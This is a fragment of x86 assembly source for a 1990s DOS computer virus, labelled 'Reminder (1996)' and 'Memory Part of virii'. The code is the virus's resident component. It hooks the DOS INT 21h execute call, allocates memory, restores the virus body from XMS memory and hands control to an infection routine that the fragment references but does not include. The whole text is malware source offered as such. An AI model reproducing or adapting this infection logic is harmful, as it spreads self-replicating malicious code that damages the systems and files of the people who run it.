; (c) Reminder (1996)
; Memory Part of virii (end of first mcb)	

rez_part:
pushf
push ax

cmp ah,4bh
jnz quit_rez

jmp real_rez_part

quit_rez:
pop ax
popf
db 0eah
old dd 0


real_rez_part:

;---------------------
;mov ax,ss
;mov cs:[_ss],ax
;mov cs:[_sp],sp

;cli
;mov ax,09dah
;mov ss,ax
;mov sp,600
;sti
;-------------------

push ax bx cx dx bp si di ds es

mov bx,(virlen+15)/16+(500/16)
mov ah,48h
int 21h
jc sux_xms

mov word ptr cs:[offset_destination+2],ax
mov cx,ax
;--------------------------------------------------------------------
push cs
pop ds

mov si,offset emm

mov ah,0bh
call xms

cmp ax,1
jnz restore_memory

mov ax,offset restore_memory
push cs
push ax		; return

sub cx,10h
push cx
mov ax,offset infect
push ax
retf

restore_memory:

mov bx,word ptr cs:[offset_destination+2]
mov es,bx
mov ah,49h
int 21h

sux_xms:
pop es ds di si bp dx cx bx ax

;---------------
;mov ax,cs:[_ss]
;cli
;mov ss,ax
;mov sp,cs:[_sp]
;sti
;--------------

jmp quit_rez

emm:
len_of_block 		dd 0		; virlen
handle_source		dw 0		; handle in xms
offset_source		dd 0		; 0
handle_destination	dw 0		; 0
offset_destination	dd 0		; 0

handle dw 0

xms:
db 09ah
xms_vect dd 0				; xms vect
ret

;_ss dw 0
;_sp dw 0
